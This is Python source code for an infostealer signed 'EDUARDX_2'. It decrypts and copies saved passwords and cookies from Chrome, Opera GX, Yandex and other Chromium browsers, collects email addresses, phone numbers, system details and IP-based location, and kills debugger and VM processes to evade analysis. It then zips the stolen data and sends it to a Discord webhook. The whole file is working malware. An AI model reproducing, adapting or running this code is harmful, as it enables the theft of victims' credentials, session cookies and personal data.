import os, json, psutil #CODE EDUARDX_2
import time as lapse #CODE EDUARDX_2
import requests 
import zipfile
from discord_webhook import DiscordWebhook, DiscordEmbed
import base64, sqlite3
import shutil, psutil
import platform
import subprocess
from datetime import datetime, timedelta
import win32crypt
import threading
import re as r__
from Crypto.Cipher import AES

RUTES = [f'{os.getenv("TEMP")}\Program-dll']

_P0P3N_ = ('x96dbg', 'vmsrvc', 'x32dbg','fakenet', 'dumpcap', 'httpdebuggerui', 'wireshark', 'fiddler', 'vboxservice', 'df5serv', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'vmwareservice', 'vmwaretray', 'discordtokenprotector')
_g3mil_ = ['gmail.com','yahoo.com','outlook.com','hotmail.com','aol.com','icloud.com','protonmail.com','yandex.ru',
    'zoho.com','mail.com','gmx.com','live.com',
    'fastmail.com',
    'inbox.com',
    'tutanota.com',
    'rocketmail.com',
    'mail.ru',
    'comcast.net',
    'att.net',
    'verizon.net']

_ph_n = [10, 7, 6, 11, 24, 23, 15, 16, 18, 19, 12, 14, 26, 9, 8]
byt0s = [r'\temp-dll', r'\Imagenes.zip']

class Sett0fxC:
    def __init__(self) -> None:
        self.SET_LOCAL = (os.getenv("LOCALAPPDATA"),os.getenv("APPDATA"))
                          
    def sett_args_browser(self):
        _File_List = []
        data_br0wser =  (
                        r"rute\Google\Chrome\User Data\Default|rute\Google\Chrome\User Data",
                        r"rute\uCozMedia\Uran\User Data\Default|rute\uCozMedia\Uran\User Data",
                        r"rute\Google\Chrome SxS\Default|rute\Google\\Chrome SxS\\User Data",
                        r"rute\Kometa\Default|rute\Kometa\User Data",
                        r"rute\NETGATE Technologies\BlackHawk\Default|rute\NETGATE Technologies\BlackHawk\User Data",
                        r"rute\Opera Software\Opera GX Stable|rute\Opera Software\Opera GX Stable",
                        r"rute\Yandex\YandexBrowser\User Data\Default|rute\Yandex\YandexBrowser\User Data")
        for e in data_br0wser:
            for rute in self.SET_LOCAL:
                _File_List.append(e.replace("rute", rute))
        return _File_List
    
    def c00kes_browser(self):
        _File_c00kes = []
        c00k3s_br0s3r = (r"rute\Google\Chrome\User Data\Default\Network|rute\Google\Chrome\User Data",
                         r"rute\NETGATE Technologies\BlackHawk\Network|rute\NETGATE Technologies\BlackHawk\User Data",
                         r"rute\uCozMedia\Uran\User Data\Default\Network|rute\uCozMedia\Uran\User Data",
                         r"rute\Google\Chrome SxS\Default\Network|rute\Google\Chrome SxS\User Data",
                         r"rute\Kometa\Default\Network|rute\Kometa\User Data",
                         r"rute\Opera Software\Opera GX Stable\Network|rute\Opera Software\Opera GX Stable",
                         r"rute\Yandex\YandexBrowser\User Data\Default\Network|rute\Yandex\YandexBrowser\User Data")
        for e in c00k3s_br0s3r:
            for rute in self.SET_LOCAL:
                _File_c00kes.append(e.replace("rute", rute))
        return _File_c00kes
    
class Acust3cP4th:
    FILE_PATH_COOK = "Cookies_id.db"
    FILE_PATH_P4SS = "DataSystem_id.db"

class Acustic_data:
    def chrome_set_hours(self, data_hours):
        if data_hours != 864000000000 and data_hours:
            return datetime(1601, 1, 1) + timedelta(microseconds=data_hours)
        else:
            return ""
    
    def dr3cpt_fil3(self, path_state):
        path_find = os.path.join(path_state + "\Local State")
        with open(path_find, "r", encoding="utf-8") as data_find_path:
            ll_state = data_find_path.read()
            ll_state = json.loads(ll_state)

        key_data = base64.b64decode(ll_state['os_crypt']['encrypted_key'])[5:]
        
        return win32crypt.CryptUnprotectData(key_data, None, None, None, 0)[1]
      #CODE EDUARDX_2  
        
    def drecypt_using(self, data_cry, key):
        try:
            iv_u = data_cry[3:15]
            data_cry = data_cry[15:]
            cipher_d = AES.new(key, AES.MODE_GCM, iv_u)

            return cipher_d.decrypt(data_cry)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(data_cry, None, None, None,0)[1])
            except:
                return ""
        
class Sessi0nD4ta0fPc:
    
    def __init__(self) -> None:
        self.C0NSULT = "http://ip-api.com/json"
        self.RQ = requests.session()
        
    def tr4d3r_gm3il(self, val3u__):
        try:
            if '@' in val3u__:
                find_ = val3u__.split("@")
                if find_[1] in _g3mil_:
                    re_em3l = find_[0] +"@" + find_[1]
                    final_1 = f"[+] - EMAILS: {re_em3l}\n"        
            else:
                if len(val3u__) in _ph_n:
                    phind_ = r'^\d+$'
                    if r__.match(phind_, val3u__):
                        nm = f"[+] - NUMERO: {val3u__}\n"
            with open(f'{RUTES[0]}\\DateUser\\counts.txt', 'a') as ar_:
                if 'final_1' in locals():  # Verifica si las variables ya estan definidas y procede a escribirlo en el archivo
                    ar_.write(final_1)
                if 'nm' in locals():  
                    ar_.write(nm)       
        
        except Exception as e: pass

    def g3tD3ta_state_identify(self):
        try:
            r = self.RQ.get(url=self.C0NSULT)
            if 'success' in r.json()['status']:
                country  = r.json()['country']
                region = r.json()['regionName']
                ciudad = r.json()['city']
                qr = r.json()['query']
                lat = r.json()['lat']
                lon = r.json()['lon']
                return [country, region, ciudad, qr, lat, lon]
            else: 
                country = "Error :("
                qr = "Error :("
                region = "Error :("
                ciudad = "Error :("
                qr = "Error :("
                lat = "Error :("
                lon = "Error :("
                return [country, region, ciudad, qr, lat, lon]
        except:
            pass 
    
    def zi3Image_(self):
        x0r = os.getenv("TEMP") + byt0s[0]
        if os.path.exists(x0r):
            if os.path.exists(x0r + byt0s[1]):
                return ["COMPLETED", x0r + byt0s[1]]
            else:
                return ['ARCHIVE0']
        else:
            return ['RUTE0']
            
    def g3pathErr0r(self, arg):
        f3le_err0r = open(f"{RUTES[0]}\\DateUser\\error_browser.txt", "a")
        f3le_err0r.write(arg + os.linesep)
        f3le_err0r.close()

    @staticmethod
    def pop3n_service():
        pr0ces_ = psutil.process_iter(attrs=['pid', 'name'])
        for _p in pr0ces_:
            if _p.info['name'].split(".")[0].lower() in _P0P3N_:
                subprocess.run(f"taskkill /F /PID {_p.info['pid']}", shell= True, capture_output= True)
                
    @staticmethod
    def zip_dat3_dd():
        compression = zipfile.ZIP_DEFLATED
        zsp = zipfile.ZipFile(f"{RUTES[0]}\\DateUser\\Data0fSystem.zip", mode="w")
        zsp.write(f"{RUTES[0]}\\DateUser\\CookedGrabb3r.db", compress_type=compression)
        zsp.write(f"{RUTES[0]}\\DateUser\\P4ssW0rd.db", compress_type=compression)
        zsp.write(f"{RUTES[0]}\\DateUser\\error_browser.txt", compress_type=compression)
        zsp.close()
#CODE -> EDUARDX_2    

class ObtenIngDateBr0ws3r:
    
    def acustic_chr0m3(self, path_f, path_d, id_pr0c3ss):
        find_sqlite = os.path.join(path_f + "\Cookies")
        if os.path.exists(find_sqlite):
            file_s = Acust3cP4th().FILE_PATH_COOK.replace('id', str(id_pr0c3ss))
            if not os.path.isfile(file_s):
                shutil.copyfile(find_sqlite, file_s)
            conect_db = sqlite3.connect(file_s)
            conect_db.text_factory = lambda body_d: body_d.decode(errors="ignore")
            cursor = conect_db.cursor()
            data = cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies")
            key_select = Acustic_data().dr3cpt_fil3(path_d)
            create_db = sqlite3.connect(f"{RUTES[0]}\\DateUser\\CookedGrabb3r.db")
            cursor_f3tch = create_db.cursor()
            cursor_f3tch.execute('''CREATE TABLE IF NOT EXISTS logout_cook 
                        (host varchar(27) NULL,
                        nombre varchar(30) NULL,
                        cookie TEXT,
                        tiempo_creacion TEXT,
                        acces_tiempo TEXT,
                        expirate TEXT)''')
            
            
            for host, nombre, valor, utc_moment, acces_l, expire, encrypted in data.fetchall():
                if not valor:
                    value_decryp = Acustic_data().drecypt_using(encrypted, key_select)
                else:
                    value_decryp = valor
                cursor_f3tch.execute("INSERT INTO logout_cook (host, nombre, cookie, tiempo_creacion, acces_tiempo, expirate) VALUES (?,?,?,?,?,?)",
                                    (host, nombre, value_decryp, utc_moment, acces_l, expire))
            create_db.commit()
            create_db.close()
            conect_db.close()
            os.remove(file_s)
        else: Sessi0nD4ta0fPc().g3pathErr0r(f"[!] - La ruta de las Cookies no existe en: {find_sqlite}")
        
        
    def acust3c_chro0m3P4ss(self, path_d, path_b, id_pr0cess):
        p3db_db = os.path.join(path_d + "\Login Data")
        if os.path.exists(p3db_db):
            
            state_file = Acust3cP4th().FILE_PATH_P4SS.replace('id', str(id_pr0cess))
            shutil.copyfile(p3db_db, state_file)
            connect_sys = sqlite3.connect(state_file)
            cursor = connect_sys.cursor()
            using_cursor = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall() 
            create_db = sqlite3.connect(f"{RUTES[0]}\\DateUser\\P4ssW0rd.db")
            cursor_f3tch = create_db.cursor()
            cursor_f3tch.execute("CREATE TABLE IF NOT EXISTS sys_log (uri varchar(70) NULL, user varchar(50) NULL, password_d varchar(235))")
            k3y_tl = Acustic_data().dr3cpt_fil3(path_b)
            for url, user, p4ss in using_cursor:
                Sessi0nD4ta0fPc().tr4d3r_gm3il(user)
                final_p4ss = Acustic_data().drecypt_using(p4ss, k3y_tl)
                cursor_f3tch.execute("INSERT INTO sys_log (uri, user, password_d) VALUES (?,?,?)", (url, user, final_p4ss))
            create_db.commit()
            create_db.close()
            connect_sys.close()
            os.remove(state_file)
        else: Sessi0nD4ta0fPc().g3pathErr0r(f"[!] - La ruta de las Pasword No existe en: {p3db_db}")
        
        
class M4inHooks:

    def main_find(self):
        data_br0wser =  Sett0fxC().sett_args_browser()
        #----------------------------------------------------------------C00ki3ssss--------------------------------------------------
        c00k3s_br0s3r = Sett0fxC().c00kes_browser()   
        hilos_dat = list() 
        try:

            for br02wser_p4ss in data_br0wser:
                lapse.sleep(3)
                h = threading.Thread(target=ObtenIngDateBr0ws3r().acust3c_chro0m3P4ss, args=(br02wser_p4ss.split("|")[0], br02wser_p4ss.split("|")[1], threading.get_ident()))
                hilos_dat.append(h)
                h.start()

            for br0ws3r_c00k in c00k3s_br0s3r:
                lapse.sleep(3)
                c0 = threading.Thread(target=ObtenIngDateBr0ws3r().acustic_chr0m3, args=(br0ws3r_c00k.split("|")[0], br0ws3r_c00k.split("|")[1], threading.get_ident())) 
                hilos_dat.append(c0)
                c0.start()

            for t__ in hilos_dat:
                t__.join()
            
            return ["EXECUTE"]
                
        except Exception as e:
            return [str(e), "FAILED"]
            
   #CODE EDUARDX_2

    def main_dc_h00k(self, date_h00k_url):
        _x = Sessi0nD4ta0fPc().zi3Image_()
        name_c = platform.uname()
        bt_pc0 = psutil.sensors_battery()
        ip_info = Sessi0nD4ta0fPc().g3tD3ta_state_identify()
        Sessi0nD4ta0fPc().pop3n_service()
       
        #
        webhook = DiscordWebhook(url=date_h00k_url, username="Michael",  avatar_url="https://i.postimg.cc/50cn55ND/corle.jpg")
        embed_mssg = DiscordEmbed(title=f"El usuario {os.getenv('USERNAME')} ejecuto el archivo.:space_invader:")
        embed_mssg.add_embed_field(
            name=f"INFORMACIÓN DEL SISTEMA. :desktop:",
            value=f":technologist:`SISTEMA:` {name_c.system}\n:space_invader:`NOMBRE:` {name_c.node}\n:pager:`VERSIÓN:` {name_c.version}\n:desktop:`MAQUINA:` {name_c.machine}\n:keyboard:`PROCESADOR:` {name_c.processor}\n",
            inline=False
        )
        if bt_pc0 is not None:
            
            embed_mssg.add_embed_field(
                name="INFORMACIÓN BATERIA.:battery:",
                value=f":low_battery:`PORCENTAJE:` {round(bt_pc0.percent, 1)}%\n:stopwatch:`TIEMPO:` {round(bt_pc0.secsleft/3600, 2)}%\n",
                inline=False
            )
        else:
            embed_mssg.add_embed_field(
                name="INFORMACIÓN BATERIA.:battery:",
                value=f":low_battery:`PORCENTAJE:` NULL%\n:stopwatch:`TIEMPO:` NULL%\n",
                inline=False
            )
        embed_mssg.add_embed_field(
            name="RED USUARIO. :bust_in_silhouette:",
            value=f":satellite:`IP:` **{ip_info[3]}**\n:map:`PAIS:`**{ip_info[0]}**\n:round_pushpin:`REGION:` **{ip_info[1]}**\n:milky_way:`CIUDAD:` **{ip_info[2]}**\n:airplane:`LATITUD:` **{ip_info[4]}**\n:airplane_arriving:`LONGITUD:` **{ip_info[5]}**",
            inline=False
        )
        
        embed_mssg.set_footer(text="By: Eduardx_2 or D0A")
        if self.main_find()[0] == "EXECUTE":
            Sessi0nD4ta0fPc().zip_dat3_dd()
            with open(f"{RUTES[0]}\\DateUser\\Data0fSystem.zip", 'rb') as f:
                webhook.add_file(f.read(), filename="Data0fSystem.zip")
            if os.path.exists(f'{RUTES[0]}\\DateUser\\counts.txt'):
                phra__ = []
                __n = []
                with open(f'{RUTES[0]}\\DateUser\\counts.txt', 'r') as __F:
                    for l__ in __F:
                        if l__.startswith('[+] - EMAILS:'):
                            phra__.append(l__.split(":")[1].strip())
                        elif l__.startswith('[+] - NUMERO:'):
                            __n.append(l__.split(":")[1].strip())
                        else: 
                            embed_mssg.add_embed_field(
                                name="CUENTAS.:flags:",
                                value=f"NO SE ENCONTRARON ESTOS DATOS.",
                                inline=False 
                            ) 
                    if len(phra__) >= 1:
                        embed_mssg.add_embed_field(
                            name="CUENTAS.:flags:",
                            value=f":envelope:`GMAIL:` **{phra__[0]}**\n:satellite_orbital:`DOMINIO:` **{phra__[0].split('@')[1].strip()}**\n:printer:`GMAILS:` **{len(phra__)}**",
                            inline=False
                        )
                    else: pass
                    if len(__n) >= 1:
                        embed_mssg.add_embed_field(
                            name="NÚMERO.:telephone_receiver:",
                            value=f":telephone:`NÚMERO:` **{__n[0]}**",
                            inline=False
                        )
                    else: 
                        embed_mssg.add_embed_field(
                            name="NÚMEROS.:telephone_receiver:",
                            value=f":telephone:`NÚMERO:` **SIN REGISTRO**",
                            inline=False
                        )
            else:
                embed_mssg.add_embed_field(
                    name="CUENTAS.",
                    value=f"`ERROR :(`",
                    inline=False
                )
        else:
            embed_mssg.add_embed_field(
                name="ERROR",
                value=f"`ALGO FALLO:` {self.main_find()[0]}",
                inline=False
            )
        if _x[0] == "COMPLETED":
            with open(_x[1], 'rb') as f_:
                webhook.add_file(f_.read(), filename="Imagenes.zip")
        else:
            embed_mssg.add_embed_field(
                name="IMAGENES.",
                value=f"OCURRIO UN ERROR, EL ARCHIVO NO PUDO SER CARGADO.",
                inline=False
            )    
        webhook.add_embed(embed_mssg)
        webhook.execute()

       
if __name__ == "__main__":
    with open(f"{RUTES[0]}\\token.txt") as fite_line:
        line_t0ken = fite_line.readlines()
        for t0ken_sess0n in line_t0ken:       
            M4inHooks().main_dc_h00k(t0ken_sess0n.strip()[3:])

#EDUARDX_2 -> CODE